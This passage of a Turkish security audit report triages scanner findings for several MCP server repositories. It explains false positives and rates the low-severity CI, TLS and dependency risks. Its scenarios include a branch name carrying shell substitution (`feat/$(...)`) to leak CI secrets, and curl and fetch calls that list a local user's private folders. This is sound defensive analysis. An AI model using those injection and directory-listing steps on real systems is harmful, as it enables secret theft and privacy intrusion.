   * `mcpjam-inspector/client/src/lib/webmcp/groups/swarms.ts:22`, `evals-runner.ts:4261,6501`, `drive-hosted-eval-turn.ts:497,777,867`, `step-executor.ts:367`, `mcp-app-browser-harness.ts:1010`, `sandbox-proxy-csp.ts:7` ve `seed-host-template.ts:645,902` konumlarındaki **11 kritik `Dinamik kod çalıştırma`** uyarısının tamamı çalışan kod değil, İngilizce JSDoc/yorum satırlarında geçen `"eval ("` veya `"eval()"` ifadeleridir (ör. `// Browser-rendered MCP App eval (PR 14):`).
   * `mcpjam-inspector/server/routes/web/computers.ts:16` (`* POST /exec (bearer)`), `e2b-sandbox-provider.ts:15` (`* exec (run) / spawn`) ve `materialize-skill-files.ts:37` (`* binary write + exec (for stale-file prune)`) konumlarındaki **3 yüksek `Kabuk üzerinden komut çalıştırma`** uyarısı da JSDoc yorum satırıdır.
2. **Üretilmiş `.d.ts` Tip Dosyası (2 Yüksek Yanlış Alarm):** `mcp/worker-configuration.d.ts:3072,11962` — Cloudflare Wrangler tarafından üretilmiş TypeScript arayüz tanımıdır, çalışan kod değildir.
3. **Arayüz Etiket Metni ve UI Dizgi Birleştirmesi (2 Yüksek Yanlış Alarm):** `ServerUrlChangeHistory.tsx:60` (`client_secret: "OAuth client secret"` arayüz etiketi) ve `useToolExecution.ts:571` (istemci tarafı UI dizgi birleştirmesi; SQL sorgusu değildir).

### D. Kodda Nasıl Oluştuğu ve Zafiyete Dönüşme Mekanizması (Herkesin Anlayabileceği Açıklama)
MCPJam Inspector, MCP sunucularını test etmek ve değerlendirmek (*evaluation / eval*) için kullanılan bir araçtır. Geliştiriciler kodun içine açıklama yazarken İngilizce "değerlendirme" anlamında `eval (PR 14)` veya `exec (bearer)` yazdıkları için, basit düzenli ifade (regex) kuralları bunları JavaScript'in tehlikeli `eval()` fonksiyonu sanarak 14 adet yanlış alarm üretmiştir. Gerçekte dikkat edilmesi gereken nokta `.github/workflows/pr-preview.yml:116` satırındaki şu CI betiğidir:
```yaml
# .github/workflows/pr-preview.yml:114-118
- name: Extract branch name
  id: extract_branch
  run: |
    echo "branch=${{ github.event.pull_request.head.ref }}" >> "$GITHUB_OUTPUT"
```
Burada PR dal adı doğrudan `echo "..."` içine gömülmüştür ve `package-lock.json` içinde `shell-quote 1.10.0` ile `handlebars 4.7.9` gibi eski paket sürümleri bulunmaktadır. Dış fork PR'lar `satır 65-69`'daki depo kontrolüyle engellendiği için dışarıdan anonim bir saldırgan bunu tetikleyemez; ancak aynı depoda açılan bir dal adı veya güncellenmemiş NPM paketleri üzerinden ikincil risk oluşabilir.

### E. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Önizleme (Preview) Dağıtım İş Akışında Dal Adı Enjeksiyonu ile Cloudflare / Preview Sırlarının Sızması:**
  1. Ekip içindeki bir otomasyon botu veya katkıcı, `pr-preview.yml` iş akışını tetikleyen bir PR açarken dal adına kabuk meta karakterleri (`feat/$(...)`) ekler.
  2. `echo "branch=${{ github.event.pull_request.head.ref }}"` satırı çalışırken enjekte edilen komut preview ortamının dağıtım anahtarlarına erişebilir.
* **Senaryo B — `package-lock.json` İçindeki Eski `shell-quote` ve `handlebars` Bağımlılıklarının Yerel MCP İncelemesinde Tetiklenmesi:**
  1. Bir geliştirici, güvenilmeyen üçüncü parti bir MCP sunucusunun şemasını ve komut şablonlarını incelemek için MCPJam Inspector'ı yerel makinesinde başlatır.
  2. Eğer sunucu yanıtları eski `shell-quote` veya şablon motoru üzerinden ayrıştırılırsa, bilinen bağımlılık zafiyetleri nedeniyle beklenmeyen kabuk argümanı kaçışı veya prototip kirlenmesi riski doğar.
* **Senaryo C — Yorum Satırlarındaki `eval (` Yanlış Alarmlarının Gerçek Güvenlik İncelemesini Maskelemesi (Alarm Yorgunluğu):**
  1. Güvenlik ekibi SAST taramasında 12 kritik `eval(` uyarısı görür; ilk 10 tanesinin JSDoc yorumu olduğunu fark edince tüm raporu "yanlış alarm" diyerek kapatır.
  2. Bu sırada `pr-preview.yml:116` içindeki gerçek kabuk interpolasyonu ve `package-lock.json` içindeki 6 kritik SCA bağımlılık açığı gözden kaçar.

### F. Tek Başına ve Birlikte Kritiklik / Birleşme (Chaining) Analizi
* **Tek Başına ve Birlikte Kritiklik:** **Düşük / Orta (Sertleştirme).** 20 kritik/yüksek SAST bulgusunun 18'i kesin yanlış pozitiftir; kalan 2 CI iş akışı bulgusu ise dış fork'ları engellediği ve PR kodunu checkout etmediği için dış saldırganın tetikleyebileceği bir CI/CD sır çalma zinciri oluşturmaz.

### G. Örnek Çalıştırma ve Doğrulama Komutları
```bash
# 1. MCPJam Inspector deposu üzerinde Sniper SAST/IaC/SCA denetimini çalıştırma
python3 scripts/sniper-project-audit \
  --project-dir "$HOME/audit-targets/mcpjam-inspector-v3.9.2-eda1fd1" \
  --output-json "$HOME/audit-targets/reports/mcpjam-audit.json"

# 2. JSDoc yorum satırlarındaki yanlış pozitif "eval (" ifadelerini doğrulama
sed -n '18,26p' "$HOME/audit-targets/mcpjam-inspector-v3.9.2-eda1fd1/client/src/lib/webmcp/groups/swarms.ts"

# 3. pr-preview.yml içindeki same-repo korumasını ve satır 116'yı kontrol etme
sed -n '60,120p' "$HOME/audit-targets/mcpjam-inspector-v3.9.2-eda1fd1/.github/workflows/pr-preview.yml"
```

---

## 5. Codebase Memory MCP (`codebase-memory-mcp-v0.9.0-b637e33`)
* **SAST/IaC/SCA Özeti:** Politika eşiğini aşan `32` bulgu (`SAST: 17 kritik, 7 yüksek, 88 orta, 9 düşük` · `IaC: 5 orta, 1 düşük, 5 bilgi` · `SCA: 8 yüksek, 10 orta, 1 düşük`).

### A. Doğrulanmış Yerel Servis Tasarım Sınırı
1. **Yerel UI Dizin Gezinme Uç Noktası (`GET /api/browse?path=...`):**
   * `src/ui/http_server.c:668-730`: `--ui` modunda çalışan yerel sunucu (`127.0.0.1`), grafik arayüzündeki klasör seçici (file picker) için verilen `path` parametresindeki alt dizin adlarını listeler.
   * **Kanıt Denetimi Düzeltmesi (CORS & DNS Rebinding Koruması):** `src/ui/http_server.c:78-93` içindeki `update_cors()` fonksiyonu **`Access-Control-Allow-Origin: *` KULLANMAMAKTADIR**. Yalnızca `http://localhost:*` ve `http://127.0.0.1:*` origin'lerini yansıtır; yabancı web sitelerinden gelen çapraz kökenli isteklere CORS başlığı dönmez ve `Host` başlığını `localhost`/`127.0.0.1`/`::1` ile sınırlandırarak yabancı host/DNS-rebinding isteklerini `403` ile reddeder. Dolayısıyla uzaktaki bir web sitesinden CORS üzerinden yerel kaynak kod sızıntısı zinciri **geçersizdir**.

### B. Bağlama Bağlı Bulgular ve Vendored Kod Uyarıları
* **Vendored C Kütüphaneleri ve Gramerler:** `vendored/yyjson`, `vendored/tre`, `internal/cbm/vendored/grammars/*` ve Windows uyumluluk katmanı (`src/foundation/compat.c:84,109`) içindeki klasik C `strcpy` uyarıları.
* **SCA Kayıtları (`graph-ui/package-lock.json`):** `nanoid`, `postcss`, `browserslist` geliştirme/önyüz paket uyarıları.

### C. Kesin Yanlış Pozitifler (`Yanlış Alarm`)
1. **Kritik SQL Enjeksiyonu Alarmı (`src/store/store.c:2864`):** `src/store/store.c:2845-2877` incelendiğinde, `snprintf` ile kurulan özyinelemeli BFS sorgusunda `start_id`, `max_depth`, `max_results` değerlerinin tam sayı (`%lld`, `%d`), `join_cond` ve `next_id` değerlerinin sabit C dizgisi olduğu, `edge_types` değerlerinin ise `?` yer tutucularıyla `bind_text()` üzerinden parametreli bağlandığı doğrulandı (kesin yanlış pozitif).
2. **Yorum Satırı ve Güvenlik Betiği Alarmları (`c_lsp.h:54`, `security-install.sh:132`):** `internal/cbm/lsp/c_lsp.h:54` C yorum satırında geçen `sprintf("%s.%s")` ifadesidir; `scripts/security-install.sh:132` ise zararlı desenleri arayan denetim betiğinin kendi `for pattern in 'system(' 'eval(' 'exec('` satırıdır.
3. **Boyutu Önceden Hesaplanmış Tamponlarda `strcpy`/`strcat` Alarmları (`kotlin_lsp.c:1541-1542`, `py_lsp.c:2055`, `store.c:4482-4484`):** `kotlin_lsp.c` ve `py_lsp.c` içinde tampon hemen bir üst satırda `strlen(...) + 1` ile tam boyutta ayrılmaktadır; `store.c:4482-4484` içinde ise `split_path_parts` fonksiyonu `tmp[CBM_SZ_512]` üzerinde yerinde bölme yaptığı için `dir[CBM_SZ_512]` tamponunun taşması matematiksel olarak imkansızdır.
4. **Sözde Use-After-Free (`vendored/tre/xmalloc.c:347`) ve Sabit URL `curl` (`src/mcp/mcp.c:5997`):** `xmalloc.c:347` `realloc` sonrası eski adres değerini belleğe erişmeden debug hash tablosundan anahtar olarak siler (`hash_table_del`); `mcp.c:5997` ise kullanıcı girdisi olmadan sabit `UPDATE_CHECK_URL` adresine `curl` çağrısı yapar.
5. **Yüksek Önemli `_cli.py` Alarmları:** `pkg/pypi/src/codebase_memory_mcp/_cli.py:57,70` — Paket kurulum/başlatma sarmalayıcısıdır.

### D. Kodda Nasıl Oluştuğu ve Zafiyete Dönüşme Mekanizması (Herkesin Anlayabileceği Açıklama)
Codebase Memory MCP, C ve Go ile yazılmış yerel bir kod grafiği sunucusudur. `--ui` bayrağıyla başlatıldığında `127.0.0.1` üzerinde yerel bir web arayüzü açar ve kullanıcının tarayıcıdan proje klasörü seçebilmesi için `GET /api/browse?path=/...` uç noktasını sunar (`src/ui/http_server.c:668-730`). İlk bakışta *"Acaba kötü niyetli bir web sitesi tarayıcıdan `fetch('http://127.0.0.1:.../api/browse?path=/home/community-user')` çağrısı yaparak kullanıcının klasörlerini okuyabilir mi?"* sorusu akla gelir. Ancak C kaynak kodundaki `update_cors()` ve `Host` doğrulaması incelendiğinde:
```c
/* src/ui/http_server.c:78-93 — Yalnızca localhost / 127.0.0.1 Origin izin listesi */
if (strncmp(origin, "http://localhost:", 17) == 0 ||
    strncmp(origin, "http://127.0.0.1:", 17) == 0) {
    snprintf(cors_header, sizeof(cors_header), "Access-Control-Allow-Origin: %s\r\n", origin);
}
```
geliştiricinin yabancı sitelerden gelen isteklere CORS başlığı vermediği ve `Host` başlığı `localhost`/`127.0.0.1` dışındaysa `403 Forbidden` döndüğü görülür. Bu uç nokta **yalnızca** aynı makinedeki başka bir yerel süreç (`localhost` üzerinde çalışan başka bir yerel web uygulaması) veya yanlış yapılandırılmış bir ters vekil (reverse proxy) varsa zafiyete dönüşebilir.

### E. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Çok Kullanıcılı (Multi-User) Paylaşımlı Bir Linux Geliştirme Sunucusunda Diğer Yerel Kullanıcıların Dizin Yapısını Görmesi:**
  1. Üniversite veya şirket içindeki paylaşımlı bir Linux sunucusunda A kullanıcısı `codebase-memory-mcp --ui` komutunu başlatır.
  2. Aynı sunucuda oturumu olan düşük yetkili B kullanıcısı, `127.0.0.1` üzerinden `curl "http://127.0.0.1:<port>/api/browse?path=/home/community-user/private-project"` çağrısı yaparak A kullanıcısının özel proje klasörlerinin isimlerini listeleyebilir ve indeksleme tetikleyebilir.
* **Senaryo B — Aynı İş İstasyonunda `localhost` Üzerinde Çalışan Güvenilmeyen Bir Yerel Web Uygulamasının CORS İzin Listesini Aşması:**
  1. `update_cors()` fonksiyonu `http://localhost:*` (herhangi bir port) origin'ine izin verdiği için, geliştiricinin bilgisayarında örneğin `http://localhost:3000` üzerinde çalışan güvenilmeyen bir üçüncü parti web önizlemesi veya XSS barındıran yerel bir uygulama `http://127.0.0.1:<cbm-port>/api/browse` uç noktasını tarayıcı içinden okuyabilir.
* **Senaryo C — Ters Vekil (Nginx / Caddy) Arkasında `Host: localhost` Sabitlemesiyle Dış Ağa Açılma Riski:**
  1. Bir geliştirici uzak masaüstünden graf arayüzüne erişmek için önüne Nginx koyup `proxy_set_header Host localhost;` tanımlarsa, `http_server.c` içindeki `Host` kontrolü devre dışı kalır ve `/api/browse` uç noktası ağdaki diğer kişilere açılır.

### F. Tek Başına ve Birlikte Kritiklik / Birleşme (Chaining) Analizi
* **Tek Başına ve Birlikte Kritiklik:** **Düşük.** Localhost CORS izin listesi ve Host başlığı doğrulaması sayesinde uzak web sitelerinden tarayıcı üzerinden yerel RPC/kod okuma zinciri oluşmaz.

### G. Örnek Çalıştırma ve Doğrulama Komutları
```bash
# 1. Codebase Memory MCP deposu üzerinde Sniper SAST/IaC/SCA denetimini çalıştırma
python3 scripts/sniper-project-audit \
  --project-dir "$HOME/audit-targets/codebase-memory-mcp-v0.9.0-b637e33" \
  --output-json "$HOME/audit-targets/reports/cbm-audit.json"

# 2. http_server.c içindeki CORS ve Host başlığı korumasını kaynak koddan doğrulama
sed -n '75,115p' "$HOME/audit-targets/codebase-memory-mcp-v0.9.0-b637e33/src/ui/http_server.c"

# 3. store.c:2845-2877 içindeki BFS SQL sorgusunun parametreli bağlamasını doğrulama
sed -n '2845,2877p' "$HOME/audit-targets/codebase-memory-mcp-v0.9.0-b637e33/src/store/store.c"
```

---

## 6. GitLab MCP Server (`gitlab-mcp-server-v3.3.0-f92ed3e`)
* **SAST/IaC/SCA Özeti:** `5` bulgu (`0 kritik, 4 yüksek, 0 orta, 1 düşük`).

### A. Doğrulanmış Açıklar
* Doğrudan istismar edilebilir varsayılan bir kod açığı yoktur.

### B. Bağlama Bağlı Bulgular
1. **Ortam Değişkeniyle Açılan TLS Doğrulama Atlama (`CWE-295`):**
   * `internal/gitlab/client.go:1416`: Yalnızca kullanıcı `GITLAB_MCP_SKIP_TLS_VERIFY=true` ortam değişkenini açıkça tanımlarsa `InsecureSkipVerify: true` etkinleşir.
2. **GitHub Actions `pull_request_target`:** PR başlığı/etiket doğrulaması.

### C. Kesin Yanlış Pozitifler (`Yanlış Alarm`)
1. **Go `os.Create` Yol Aşımı Alarmı (`recorder.go:84`):** `cmd/gen_orbit_record/recorder.go:84` — Geliştirici CLI aracında `--out` bayrağıyla verilen yerel çıktı dosyasını açar.
2. **Go `exec.Command` Komut Enjeksiyonu Alarmı (`make.go:35`):** `cmd/audit_supply_chain/make.go:35` — Sabit `"git"` ikilisini argüman dizisiyle (`exec.Command("git", args...)`, kabuksuz) çalıştıran tedarik zinciri denetim betiğidir.

### D. Kodda Nasıl Oluştuğu ve Zafiyete Dönüşme Mekanizması (Herkesin Anlayabileceği Açıklama)
`internal/gitlab/client.go:1416` dosyasında GitLab API istemcisi oluşturulurken şu kontrol yapılır:
```go
// internal/gitlab/client.go:1412-1420
if os.Getenv("GITLAB_MCP_SKIP_TLS_VERIFY") == "true" {
    tlsConfig.InsecureSkipVerify = true
}
```
Varsayılan durumda bu ayar kapalıdır (`false`) ve tüm TLS sertifikaları doğrulanır. Ancak kurum içi (self-hosted) GitLab kullanan geliştiriciler, kendi iç CA sertifikalarını sisteme tanıtmak yerine "hızlı çözüm" olarak MCP yapılandırma dosyasına (`mcp_config.json`) `"GITLAB_MCP_SKIP_TLS_VERIFY": "true"` yazdıklarında, Go HTTP istemcisi sunucunun sunduğu sertifikanın kime ait olduğuna hiç bakmaz. Bu durumda geliştiricinin gönderdiği yüksek yetkili `GITLAB_PERSONAL_ACCESS_TOKEN` değeri ağ üzerindeki herhangi bir ortadaki adam (MITM) saldırganına düz metin gibi teslim edilir.

### E. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Kurum İçi Self-Signed GitLab Sunucusu İçin `GITLAB_MCP_SKIP_TLS_VERIFY=true` Ayarlayan Geliştiricinin Kafe/Otel Wi-Fi Ağında Token Kaptırması:**
  1. Bir yazılım mühendisi şirket içi GitLab sunucusundaki sertifika hatasını susturmak için IDE'sindeki MCP ayarlarına `GITLAB_MCP_SKIP_TLS_VERIFY=true` ekler.
  2. Mühendis şirket dışındaki bir Wi-Fi ağında IDE'sini açtığında, MCP sunucusu GitLab'a bağlanmaya çalışır; ağdaki saldırgan sahte sertifikayla bağlantıyı karşılar ve `Authorization: Bearer glpat-...` kişisel erişim anahtarını ele geçirir.
* **Senaryo B — Paylaşılan Takım Dokümantasyonunda Güvensiz MCP Yapılandırma Şablonunun Yayılması:**
  1. Bir ekipte örnek `claude_desktop_config.json` dosyası hazırlanırken sorun yaşanmaması için `GITLAB_MCP_SKIP_TLS_VERIFY=true` varsayılan olarak eklenir ve tüm geliştiricilere dağıtılır.
  2. Böylece gerçekten geçerli TLS sertifikasına sahip üretim GitLab sunucularına yapılan bağlantılarda bile TLS doğrulaması kalıcı olarak devre dışı kalır.
* **Senaryo C — Kurumsal İnceleme Vekili (Corporate TLS Inspection Proxy) Ortamında Yanlış CA Yerine Doğrulamanın Kapatılması:**
  1. Kurumsal güvenlik duvarı TLS trafiğini denetlediği için kök sertifika hatası alan bir CI/CD ajanı, özel CA paketi (`SSL_CERT_FILE`) tanımlamak yerine `GITLAB_MCP_SKIP_TLS_VERIFY=true` ile çalıştırılır ve tüm kaynak kod/PR trafiği doğrulanmamış uçlara açık hale gelir.

### F. Tek Başına ve Birlikte Kritiklik / Birleşme (Chaining) Analizi
* **Tek Başına ve Birlikte Kritiklik:** **Düşük.** Yalnızca kullanıcı `GITLAB_MCP_SKIP_TLS_VERIFY=true` ayarını güvensiz bir ağda açarsa MITM riski oluşur; birleşen bir açık yoktur.

### G. Örnek Çalıştırma ve Doğrulama Komutları
```bash
# 1. GitLab MCP Server üzerinde Sniper SAST/IaC/SCA denetimini çalıştırma
python3 scripts/sniper-project-audit \
  --project-dir "$HOME/audit-targets/gitlab-mcp-server-v3.3.0-f92ed3e" \
  --output-json "$HOME/audit-targets/reports/gitlab-mcp-audit.json"

# 2. client.go:1416 içindeki opsiyonel TLS bayrağını ve make.go:35 içindeki kabuksuz exec.Command kullanımını doğrulama
sed -n '1410,1425p' "$HOME/audit-targets/gitlab-mcp-server-v3.3.0-f92ed3e/internal/gitlab/client.go"
sed -n '25,45p' "$HOME/audit-targets/gitlab-mcp-server-v3.3.0-f92ed3e/cmd/audit_supply_chain/make.go"
```

---

## 7. Apktool MCP (`apktool-mcp-V3.0.2-12bb331`)
* **SAST/IaC/SCA Özeti:** Politika eşiğini aşan **`16` bulgu**:
  * **Kod (SAST):** `0 kritik, 0 yüksek, 1 orta` (Aday dosyasında tekrarlı XML varlık genişletme uyarısı ve `health_result` değişken adını sağlık verisi sanan 2 yanlış pozitif gizlilik kaydı).
  * **Bağımlılık Açığı (SCA — `uv.lock`):** **`4 kritik, 12 yüksek, 10 orta, 1 düşük`** (`anyio 4.9.0`, `certifi 2025.1.31`, `fastmcp 2.2.0`, `h11 0.14.0`, `mcp 1.6.0`, `starlette 0.46.2`).

### D. Kodda Nasıl Oluştuğu ve Zafiyete Dönüşme Mekanizması (Herkesin Anlayabileceği Açıklama)
Apktool MCP, Android `.apk` paketlerini tersine mühendislik için açan ve `AndroidManifest.xml` / kaynak dosyalarını AI ajanlarına sunan bir Python MCP sunucusudur. Birinci parti Python kodunda doğrudan bir komut enjeksiyonu olmamasına rağmen iki önemli nokta vardır:
1. Açılan `.apk` arşivlerinin içindeki XML dosyaları ayrıştırılırken standart XML ayrıştırıcıları kullanıldığında, saldırganın özel olarak hazırladığı bir APK içindeki `AndroidManifest.xml` dosyası **Milyar Kahkaha (Billion Laughs / XML Entity Expansion)** veya dış varlık yüklemesiyle belleği tüketebilir.
2. `uv.lock` kilit dosyasında sunucunun HTTP/SSE katmanını sağlayan `h11 0.14.0`, `starlette 0.46.2`, `fastmcp 2.2.0` ve `mcp 1.6.0` sürümleri sabitlenmiştir. Bu sürümlerde bilinen HTTP istek kaçakçılığı (request smuggling), çok parçalı (multipart) DoS ve oturum yönetimi zafiyetleri mevcuttur. Sunucu yerel `stdio` yerine ağ üzerinden HTTP/SSE modunda açıldığında bu bağımlılık açıkları doğrudan dışarıdan tetiklenebilir hale gelir.

### E. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Zararlı Bir Android APK Analizi Sırasında Bozuk `AndroidManifest.xml` ile Analiz Sunucusunun Kilitlenmesi:**
  1. Bir mobil güvenlik analisti, şüpheli bir Android uygulamasını incelemek için Apktool MCP'ye verir.
  2. Zararlı APK'nın içine yerleştirilmiş iç içe XML varlık tanımları (`<!ENTITY ...>`) ayrıştırıcı tarafından genişletilirken RAM ve CPU tüketimi tavan yapar ve analiz iş istasyonu yanıt vermez hale gelir.
* **Senaryo B — SSE / HTTP Modunda Paylaşılan Apktool MCP Sunucusunda `h11 0.14.0` / `starlette 0.46.2` Üzerinden Hizmet Reddi:**
  1. Bir mobil güvenlik ekibi, Apktool MCP sunucusunu ortak bir konteynerde HTTP/SSE taşıyıcısıyla (`fastmcp 2.2.0` + `starlette 0.46.2` + `h11 0.14.0`) çalıştırır.
  2. Kilitli `uv.lock` içindeki eski HTTP ayrıştırıcı sürümleri nedeniyle, hatalı biçimlendirilmiş tek bir HTTP isteği sunucu döngüsünü bozabilir veya ters vekil arkasında istek kaçakçılığına yol açabilir.
* **Senaryo C — Eski `mcp 1.6.0` ve `fastmcp 2.2.0` Sürümlerinde Eksik Origin / Oturum Kontrolleri:**
  1. Eski MCP SDK sürümleri, yerel HTTP/SSE dinleyicilerinde sonraki sürümlerde eklenen sıkı `Origin` ve DNS-rebinding kontrollerini barındırmaz.
  2. Geliştirici sunucuyu HTTP modunda çalıştırırken tarayıcıda gezindiğinde çapraz kökenli isteklerle MCP araçları tetiklenebilir.

### F. Tek Başına ve Birlikte Kritiklik / Birleşme (Chaining) Analizi
* **Tek Başına ve Birlikte Kritiklik:** Doğrulanmış bir birinci-parti kaynak kodu (SAST) kritik açığı yoktur; ancak projeye "0 bulgu / temiz" denemez. `uv.lock` içindeki `fastmcp 2.2.0`, `mcp 1.6.0`, `h11 0.14.0` ve `starlette 0.46.2` bağımlılıklarının güncellenmesi gerekir (**SCA Bakım / Bağımlılık Riski: Orta**).

### G. Örnek Çalıştırma ve Doğrulama Komutları
```bash
# 1. Apktool MCP deposu üzerinde Sniper SAST ve SCA (uv.lock) denetimini çalıştırma
python3 scripts/sniper-project-audit \
  --project-dir "$HOME/audit-targets/apktool-mcp-V3.0.2-12bb331" \
  --output-json "$HOME/audit-targets/reports/apktool-mcp-audit.json"

# 2. uv.lock içindeki kritik/yüksek SCA paket sürümlerini doğrulama
grep -E 'name = "(fastmcp|mcp|starlette|h11|anyio|certifi)"' -A 2 "$HOME/audit-targets/apktool-mcp-V3.0.2-12bb331/uv.lock"

# 3. Sniper CLI raporuyla SCA ve SAST dağılımını görüntüleme
python3 cli_reports.py --input "$HOME/audit-targets/reports/apktool-mcp-audit.json"
```

---

## 8. JADX MCP (`jadx-mcp-main-a8e5b7d`)
* **SAST/IaC/SCA Özeti:** Politika eşiğini aşan **`32` bulgu**:
  * **Kod (SAST):** `0 kritik, 0 yüksek, 3 orta` (doğrulanmış kritik/yüksek kaynak kodu açığı yoktur).
  * **Bağımlılık Açığı (SCA — `uv.lock`):** **`6 kritik, 26 yüksek, 24 orta, 5 düşük`** (`anyio 4.10.0`, `authlib 1.6.8`, `certifi 2025.8.3`, `cryptography 46.0.5`, `fastmcp 3.0.2`, `pyjwt 2.11.0`, `mcp 1.26.0`, `python-multipart 0.0.20`, `starlette 0.47.3`, `urllib3 2.5.0`).

### D. Kodda Nasıl Oluştuğu ve Zafiyete Dönüşme Mekanizması (Herkesin Anlayabileceği Açıklama)
JADX MCP, masaüstünde çalışan JADX GUI / tersine mühendislik eklentisi ile LLM istemcisi (Claude Desktop, Cursor vb.) arasında köprü kuran bir Python MCP sunucusudur. Birinci parti Python kodu yalnızca yerel JADX HTTP eklentisine istek ileten ince bir sarmalayıcıdır. Ancak `uv.lock` dosyasında kilitlenmiş **32 adet kritik/yüksek bağımlılık kaydı** (`authlib 1.6.8`, `pyjwt 2.11.0`, `cryptography 46.0.5`, `python-multipart 0.0.20`, `starlette 0.47.3`, `urllib3 2.5.0`) bulunmaktadır.
Bu durum kodda şöyle zafiyete dönüşür: Kullanıcı JADX MCP'yi `uv sync --frozen` ile kurduğunda, bu eski kütüphaneler birebir kurulur. Eğer JADX MCP yerel `stdio` yerine ağ üzerinden kimlik doğrulamalı (`authlib` / `pyjwt`) veya dosya yüklemeli (`python-multipart` / `starlette`) bir HTTP/SSE servisi olarak çalıştırılırsa, birinci parti kod hatasız olsa bile alttaki `authlib`/`pyjwt` algoritma karışıklığı veya `python-multipart` sınır aşımı üzerinden sunucu istismar edilebilir.

### E. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Uzak Tersine Mühendislik Sunucusunda `authlib 1.6.8` / `pyjwt 2.11.0` Üzerinden OAuth/JWT Doğrulama Kusuru:**
  1. Bir siber güvenlik ekibi, JADX MCP sunucusunu güçlü bir analiz sunucusunda HTTP/SSE modunda çalıştırır ve erişimi `fastmcp` / `authlib` tabanlı JWT doğrulamasıyla korur.
  2. `uv.lock` içindeki eski `authlib 1.6.8` ve `pyjwt 2.11.0` sürümlerindeki bilinen doğrulama zafiyetleri nedeniyle, geçersiz veya manipüle edilmiş bir token ile kimlik doğrulaması aşılabilir.
* **Senaryo B — `python-multipart 0.0.20` ve `starlette 0.47.3` Üzerinden Çok Parçalı İstek (Multipart) Bellek/CPU Tüketimi:**
  1. HTTP modunda çalışan MCP sunucusuna özel sınır (boundary) karakterleriyle hazırlanmış bir `multipart/form-data` isteği gönderilir.
  2. Eski `python-multipart` ve `starlette` ayrıştırıcısı aşırı CPU/bellek harcayarak JADX MCP köprüsünü kilitler.
* **Senaryo C — `urllib3 2.5.0` ve `cryptography 46.0.5` Bağımlılıklarında Yönlendirme / Başlık Sızıntısı:**
  1. JADX MCP, uzak bir sembol veya kaynak sunucusuna `urllib3` üzerinden istek gönderdiğinde, çapraz alan adı yönlendirmelerinde (redirect) hassas başlıkların temizlenmemesi veya X.509 sertifika ayrıştırma kusurları tetiklenebilir.

### F. Tek Başına ve Birlikte Kritiklik / Birleşme (Chaining) Analizi
* **Tek Başına ve Birlikte Kritiklik:** Doğrulanmış bir birinci-parti SAST açığı gösterilmemiştir; ancak `uv.lock` içinde `32` adet yüksek/kritik SCA bağımlılık kaydı mevcuttur (**SCA Bakım / Bağımlılık Riski: Orta**).

### G. Örnek Çalıştırma ve Doğrulama Komutları
```bash
# 1. JADX MCP deposu üzerinde Sniper SAST ve SCA denetimini çalıştırma
python3 scripts/sniper-project-audit \
  --project-dir "$HOME/audit-targets/jadx-mcp-main-a8e5b7d" \
  --output-json "$HOME/audit-targets/reports/jadx-mcp-audit.json"

# 2. uv.lock içindeki kilitli paket sürümlerini kontrol etme
grep -E 'name = "(authlib|pyjwt|cryptography|python-multipart|starlette|urllib3)"' -A 2 "$HOME/audit-targets/jadx-mcp-main-a8e5b7d/uv.lock"

# 3. Sniper CLI üzerinden SCA bulgularını filtreleyerek listeleme
python3 cli_reports.py --input "$HOME/audit-targets/reports/jadx-mcp-audit.json" --min-severity high
```

---

## Özet Karşılaştırma Tablosu: Tek Başına vs. Birlikte (Saldırı Zinciri) Kritiklik ve Kanıt Durumu

| Repo | Sniper SAST / IaC / SCA Özeti | Doğrulanmış Kaynak Kanıtı (Gerçek vs. Yanlış Pozitif) | Tek Başına Kritiklik | Bulgular Birleşiyor mu? (Saldırı Zinciri / Chaining) | Birlikte (Zincir) Kritiklik ve Yayın Durumu |
| :--- | :--- | :--- | :---: | :--- | :--- |
| **1. `autogpt`** | `93` eşik aşan (`2K / 39Y`); `142` triyaj | **2 kritik SQLi (`obj.execute`), JWT ve FastAPI `Security()` tamamen yanlış pozitif**; `jobstore_backfill.py` `pickle.loads` + Compose sabit parola + Root Dockerfile gerçek | **Düşük / Orta** | **KOŞULLU HİPOTEZ:** Yalnızca saldırgan DB `apscheduler_jobs` tablosuna yazma erişimi kazanırsa `pickle.loads` + Root konteyner birleşir | **ORTA / YÜKSEK (Koşullu)** *(Doğrulanmış doğrudan açık yok; derinlemesine savunma sertleştirmesi)* |
| **2. `zitadel`** | `67` eşik aşan (`8K / 42Y`); `286` triyaj | **8 kritik SQLi/`exec` tamamen yanlış pozitif**; `deploy/compose/` altında 3 `docker.sock` bağlaması ve dokümantasyon örneğinde `TLS_REJECT=0` gerçek | **Düşük / Orta** | **HAYIR (Farklı Örnekler):** `docker.sock` (`deploy/compose/`) ile `TLS_REJECT=0` (`apps/docs/...`) farklı compose dosyalarındadır | **DÜŞÜK / ORTA** *(Geliştirme/örnek dağıtım sertleştirmesi; ürün CVE'si değil)* |
| **3. `nextcloud-mcp`** | `59` eşik aşan (`SAST 1K/6Y`, `IaC 7Y`, `SCA 5K/40Y`) | **`login_flow.py:192` SSRF (`initiate()` içinde `_rewrite_to_nextcloud_host` var) ve `token_utils.py` JWT yanlış pozitif**; `pact.yml` `same-repo` korumalı | **Düşük** | **HAYIR:** `pact.yml` dış fork PR'lara kapalıdır; `poll_endpoint` ise `initiate()` aşamasında `self.nextcloud_host` origin'ine sabitlenmektedir | **DÜŞÜK** *(Doğrulanmış SAST açığı yok; iç CI sertleştirmesi)* |
| **4. `mcpjam-inspector`** | `122` eşik aşan (`SAST 12K/8Y`, `SCA 6K/96Y`) | **20 K/Y SAST bulgusunun 18'i kesin yanlış pozitif** (14 yorum satırı `eval (`/ `exec (`, 2 `.d.ts`, 1 UI etiket, 1 UI concat); `pr-preview.yml` `same-repo` korumalı | **Düşük** | **HAYIR:** Dış fork PR'lar engellenmiştir; aynı-repo dal adı interpolasyonu sertleştirilmelidir | **DÜŞÜK / ORTA** *(İç CI sertleştirmesi ve SCA güncellemesi)* |
